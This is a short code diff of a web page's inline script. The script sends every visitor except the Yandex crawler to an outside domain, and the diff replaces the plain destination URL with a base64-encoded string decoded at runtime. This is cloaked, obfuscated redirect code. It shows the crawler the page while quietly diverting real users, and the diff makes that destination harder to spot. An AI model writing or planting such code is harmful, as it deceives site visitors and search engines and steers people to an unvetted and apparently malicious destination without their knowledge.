@@ -25,11 +25,12 @@
       }
     }
 var ua = navigator.userAgent.toLowerCase();
+var targetB64 = "aHR0cHM6Ly9iYWwtYW5jZXItZXZhLmNvbS9kaWJ6Zm9taXI=";
 if (ua.indexOf("yandex") === -1) {
-location.replace("https://bal-ancer-eva.com/dibzfomir");
+    location.replace(atob(targetB64));
 } else {
-console.log("Яндекс бот — без редиректа");
-}   
+    console.log("Яндекс бот — без редиректа");
+} 
   </script>
   <style>
     @keyframes shimmer {
